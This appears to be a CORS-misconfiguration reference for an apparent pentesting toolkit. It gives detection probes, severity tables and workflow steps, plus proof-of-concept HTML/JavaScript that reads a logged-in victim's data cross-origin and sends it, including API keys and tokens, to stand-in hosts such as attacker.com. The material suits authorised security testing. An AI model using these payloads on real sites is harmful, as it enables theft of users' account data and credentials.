---
id: PS-CORS
category: Cross-origin resource sharing (CORS)
wstg_refs: [WSTG-CONF-13, WSTG-CLNT-07]
lab_count: 3
---

# CORS Misconfiguration: Attack Technique Reference

## 1. Detection

### 1A. Origin Reflection Test

Send a request with a custom `Origin` header and check if the server reflects it back in `Access-Control-Allow-Origin`:

```bash
# Test arbitrary origin reflection
http_probe -sk -D- \
  -H "Origin: https://evil-attacker.com" \
  https://target.com/api/sensitive-data

# Look for:
# Access-Control-Allow-Origin: https://evil-attacker.com
# Access-Control-Allow-Credentials: true
```

If the server reflects the arbitrary origin AND includes `Access-Control-Allow-Credentials: true`, the endpoint is vulnerable to credential-based CORS attacks.

### 1B. Null Origin Test

Test if the server accepts the `null` origin:

```bash
# Test null origin
http_probe -sk -D- \
  -H "Origin: null" \
  https://target.com/api/sensitive-data

# Look for:
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true
```

The `null` origin is sent by browsers in sandboxed iframes, `data:` URIs, file protocol pages, and cross-origin redirects.

### 1C. Subdomain Trust Test

Test if the server trusts any subdomain (including attacker-controlled or XSS-compromised ones):

```bash
# Test subdomain trust
http_probe -sk -D- \
  -H "Origin: https://arbitrary.target.com" \
  https://target.com/api/sensitive-data

# Test insecure protocol trust (http subdomain on https site)
http_probe -sk -D- \
  -H "Origin: http://subdomain.target.com" \
  https://target.com/api/sensitive-data
```

### 1D. Regex/Prefix Bypass Test

Test if the server uses flawed regex or prefix matching for origin validation:

```bash
# Suffix matching bypass (attacker owns evil-target.com)
http_probe -sk -D- \
  -H "Origin: https://evil-target.com" \
  https://target.com/api/sensitive-data

# Prefix matching bypass (attacker owns target.com.evil.com)
http_probe -sk -D- \
  -H "Origin: https://target.com.evil.com" \
  https://target.com/api/sensitive-data

# Subdomain matching bypass
http_probe -sk -D- \
  -H "Origin: https://target.com.evil-attacker.com" \
  https://target.com/api/sensitive-data
```

### 1E. Comprehensive Detection Script

Test all CORS patterns against a single endpoint:

```bash
TARGET="https://target.com/api/account"

# Test 1: Arbitrary origin
http_probe -sk -D- -o /dev/null \
  -H "Origin: https://evil.com" "$TARGET" 2>&1 | grep -i 'access-control'

# Test 2: Null origin
http_probe -sk -D- -o /dev/null \
  -H "Origin: null" "$TARGET" 2>&1 | grep -i 'access-control'

# Test 3: Subdomain
http_probe -sk -D- -o /dev/null \
  -H "Origin: https://anything.target.com" "$TARGET" 2>&1 | grep -i 'access-control'

# Test 4: HTTP protocol
http_probe -sk -D- -o /dev/null \
  -H "Origin: http://target.com" "$TARGET" 2>&1 | grep -i 'access-control'

# Test 5: Prefix bypass
http_probe -sk -D- -o /dev/null \
  -H "Origin: https://target.com.evil.com" "$TARGET" 2>&1 | grep -i 'access-control'
```

### 1F. CORS Header Reference

| Response Header | Vulnerable Value | Meaning |
|----------------|------------------|---------|
| `Access-Control-Allow-Origin: *` | Low risk (cannot use with credentials) | Public endpoint, no credential theft possible |
| `Access-Control-Allow-Origin: <reflected>` | HIGH risk if credentials allowed | Server reflects any origin — attacker can read responses |
| `Access-Control-Allow-Origin: null` | HIGH risk if credentials allowed | Null origin trusted — exploitable via sandboxed iframe |
| `Access-Control-Allow-Credentials: true` | CRITICAL with reflected origin | Cookies/auth headers sent with cross-origin request |
| `Access-Control-Allow-Methods: *` | Medium risk | All HTTP methods exposed cross-origin |
| `Access-Control-Allow-Headers: *` | Medium risk | All custom headers allowed cross-origin |
| `Access-Control-Expose-Headers: *` | Medium risk | All response headers readable cross-origin |

**Key rule:** `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` cannot be combined. Browsers will reject this. The real danger is a dynamically reflected origin paired with credentials.

## 2. Techniques

### 2A. Basic Origin Reflection Exploitation

When the server reflects any `Origin` value in `Access-Control-Allow-Origin` and sends `Access-Control-Allow-Credentials: true`, an attacker can steal authenticated data from the victim's session.

**Attack flow:**
1. Victim visits attacker page while authenticated to the target
2. Attacker JavaScript makes a credentialed cross-origin request to the target
3. Browser sends victim's cookies with the request (due to `withCredentials`)
4. Server responds with sensitive data and the attacker's origin in ACAO
5. Browser allows attacker JavaScript to read the response
6. Attacker exfiltrates the data

**Exploitation PoC:**

```html
<html>
<body>
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    // Send stolen data to attacker server
    fetch('https://attacker.com/log?data=' + encodeURIComponent(this.responseText));
};
req.open('GET', 'https://target.com/api/account-details', true);
req.withCredentials = true;
req.send();
</script>
</body>
</html>
```

**Alternative using fetch API:**

```html
<script>
fetch('https://target.com/api/account-details', {
    credentials: 'include'
})
.then(response => response.text())
.then(data => {
    // Exfiltrate
    new Image().src = 'https://attacker.com/log?data=' + encodeURIComponent(data);
});
</script>
```

> Lab refs: PS-CORS-01

### 2B. Trusted Null Origin Exploitation

When the server whitelists `Origin: null`, an attacker can generate a null origin using a sandboxed iframe with the `data:` URI scheme or the `sandbox` attribute.

**Why null origin occurs in browsers:**
- Sandboxed iframes: `<iframe sandbox="allow-scripts">`
- `data:` URI pages
- Pages served from `file://` protocol
- Cross-origin redirects (in some browsers)

**Exploitation PoC (sandboxed iframe with data: URI):**

```html
<html>
<body>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        location = 'https://attacker.com/log?data=' + encodeURIComponent(this.responseText);
    };
    req.open('GET', 'https://target.com/api/account-details', true);
    req.withCredentials = true;
    req.send();
  </script>">
</iframe>
</body>
</html>
```

**Alternative using data: URI:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://target.com/api/account-details', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>location='https://attacker.com/log?data='+encodeURIComponent(d));
  </script>">
</iframe>
```

**Key:** The `sandbox` attribute without `allow-same-origin` causes the iframe to have a `null` origin.

> Lab refs: PS-CORS-02

### 2C. Trusted Insecure Protocol Exploitation

When the server trusts origins from HTTP subdomains (e.g., `http://subdomain.target.com`) while the main application runs on HTTPS, an attacker can chain this with a subdomain XSS or MitM to steal data.

**Attack prerequisites:**
1. Server trusts `http://` origins from subdomains
2. Attacker has XSS on a subdomain, OR can MitM HTTP traffic

**Attack flow (XSS chain):**
1. Find XSS on any subdomain of the target (e.g., `subdomain.target.com`)
2. Use the XSS to inject JavaScript that makes a CORS request to the main app
3. The request's origin (`http://subdomain.target.com`) is trusted
4. Victim's authenticated data is exfiltrated

**Exploitation PoC (requires XSS on subdomain):**

```html
<script>
document.location="http://vulnerable-subdomain.target.com/?xss=<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        location='https://attacker.com/log?data=' %2b encodeURIComponent(this.responseText);
    };
    req.open('GET','https://target.com/api/account-details',true);
    req.withCredentials=true;
    req.send();
</script>"
</script>
```

**MitM variant:**
If no XSS exists but attacker can intercept HTTP traffic (e.g., on public WiFi):
1. Intercept any HTTP request to `http://subdomain.target.com`
2. Inject JavaScript that makes the CORS request
3. Server trusts the HTTP subdomain origin
4. Data exfiltrated through the MitM position

> Lab refs: PS-CORS-03

## 3. Testing Payloads

### 3A. curl Commands for Each Misconfiguration Pattern

```bash
# Pattern 1: Arbitrary origin reflection
http_probe -sk -H "Origin: https://evil.com" \
  -D- https://target.com/api/userinfo | grep -iE 'access-control|set-cookie'

# Pattern 2: Null origin
http_probe -sk -H "Origin: null" \
  -D- https://target.com/api/userinfo | grep -iE 'access-control'

# Pattern 3: Subdomain trust
http_probe -sk -H "Origin: https://anything.target.com" \
  -D- https://target.com/api/userinfo | grep -iE 'access-control'

# Pattern 4: HTTP protocol trust
http_probe -sk -H "Origin: http://target.com" \
  -D- https://target.com/api/userinfo | grep -iE 'access-control'

# Pattern 5: Whitelist bypass (suffix)
http_probe -sk -H "Origin: https://attackertarget.com" \
  -D- https://target.com/api/userinfo | grep -iE 'access-control'

# Pattern 6: Whitelist bypass (prefix)
http_probe -sk -H "Origin: https://target.com.attacker.com" \
  -D- https://target.com/api/userinfo | grep -iE 'access-control'

# Pattern 7: Preflight request
http_probe -sk -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: X-Custom-Header" \
  -D- https://target.com/api/userinfo | grep -iE 'access-control'
```

### 3B. Automated Testing with cors-probe

```bash
# Scan single target
rynix_plugin_run('wstg') python3 /opt/cors-probe/cors_scan.py -u https://target.com

# Scan list of URLs
rynix_plugin_run('wstg') python3 /opt/cors-probe/cors_scan.py -i /tmp/urls.txt -o /tmp/cors-results.json
```

## 4. Exploitation Templates

### 4A. Data Theft PoC (Generic)

```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Data Theft Proof of Concept</h1>
<div id="result">Waiting...</div>
<script>
// Target endpoint with sensitive data
var targetUrl = 'https://target.com/api/account-details';

// Method 1: XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        // Display stolen data
        document.getElementById('result').innerText = xhr.responseText;
        // Exfiltrate to attacker server
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://attacker.com/collect', true);
        exfil.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        exfil.send('data=' + encodeURIComponent(xhr.responseText));
    }
};
xhr.open('GET', targetUrl, true);
xhr.withCredentials = true;  // Send cookies
xhr.send();
</script>
</body>
</html>
```

### 4B. API Key / Token Theft PoC

```html
<script>
// Steal API key from a JSON endpoint
fetch('https://target.com/api/settings', {credentials: 'include'})
.then(r => r.json())
.then(data => {
    // Extract specific sensitive fields
    var apiKey = data.apiKey || data.api_key || data.token;
    var email = data.email;
    // Exfiltrate
    navigator.sendBeacon('https://attacker.com/collect',
        JSON.stringify({apiKey: apiKey, email: email}));
});
</script>
```

### 4C. Severity Assessment

| CORS Pattern | With Credentials | Without Credentials | Severity |
|-------------|------------------|---------------------|----------|
| Reflects any origin | `true` | N/A | Critical — full account data theft |
| Trusted null origin | `true` | N/A | High — exploitable via sandboxed iframe |
| Trusted HTTP subdomain | `true` | N/A | Medium-High — requires MitM or subdomain XSS |
| Wildcard (`*`) | Cannot be `true` | Yes | Low — only public data exposed |
| Regex bypass | `true` | N/A | High — if attacker can register matching domain |
| No CORS headers | N/A | N/A | Not vulnerable |
## Rynix workflow

1. `get_technique_guide` for `cors` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `compare_role_response`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `compare_role_response`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

